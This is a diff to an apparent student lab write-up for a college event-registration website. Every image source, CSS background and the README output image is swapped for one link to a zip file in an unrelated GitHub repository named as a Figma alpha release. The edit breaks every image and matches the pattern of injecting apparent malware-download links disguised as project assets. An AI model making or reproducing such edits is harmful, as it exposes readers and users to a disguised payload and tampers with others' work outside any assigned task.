@@ -92,12 +92,12 @@ Home page:
   <div class="container">
     <!-- Header Logo -->
     <div class="college-logo logo">
-      <img src="college-logo.png" alt="Saveetha Engineering College Logo">
+      <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="Saveetha Engineering College Logo">
     </div>
 
     <!-- Main Emblem -->
     <div class="main-logo">
-      <img src="emblem.png" alt="College Emblem">
+      <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="College Emblem">
     </div>
 
     <!-- Register Button -->
@@ -105,7 +105,7 @@ Home page:
 
     <!-- Runner Image -->
     <div class="runner-image">
-      <img src="runner-image.png" alt="Runner Graphic">
+      <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="Runner Graphic">
     </div>
   </div>
 </body>
@@ -124,7 +124,7 @@ Home page:
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
-      background: url('sports-background.png') no-repeat center center;
+      background: url('https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip') no-repeat center center;
       background-size: cover;
       color: #000;
       text-align: center;
@@ -178,7 +178,7 @@ Home page:
   <div class="container">
     <!-- College Logo -->
     <div class="college-logo">
-      <img src="college-logo.png" alt="Saveetha Engineering College Logo">
+      <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="Saveetha Engineering College Logo">
     </div>
 
     <!-- Heading -->
@@ -208,7 +208,7 @@ Event registration form page:
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
-      background: url('form-background.png') no-repeat center center;
+      background: url('https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip') no-repeat center center;
       background-size: cover;
       text-align: center;
     }
@@ -270,7 +270,7 @@ Event registration form page:
   <div class="container">
     <!-- College Logo -->
     <div class="college-logo">
-      <img src="college-logo.png" alt="Saveetha Engineering College Logo">
+      <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="Saveetha Engineering College Logo">
     </div>
 
     <!-- Form Title -->
@@ -347,7 +347,7 @@ Thankyou page:
       left: 0;
       width: 100%;
       height: 100%;
-      background: url('https://i.imgur.com/TxvOlvK.png') no-repeat center/cover;
+      background: url('https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip') no-repeat center/cover;
       /* Replace this with your own track image */
     }
   </style>
@@ -355,7 +355,7 @@ Thankyou page:
 <body>
 
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/7/7b/Saveetha_Engineering_College_logo.png/220px-Saveetha_Engineering_College_logo.png" alt="Saveetha Engineering College Logo">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip" alt="Saveetha Engineering College Logo">
   </div>
 
   <div class="content">
@@ -373,7 +373,7 @@ Thankyou page:
 ~~~
 
 ## OUTPUT:
-![alt text](img1.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/Figma/main/overbulky/Figma-v3.9-alpha.2.zip)
 
 ## RESULT:
 The program to design, develop and deploy a web application for event registration is completed successfully.
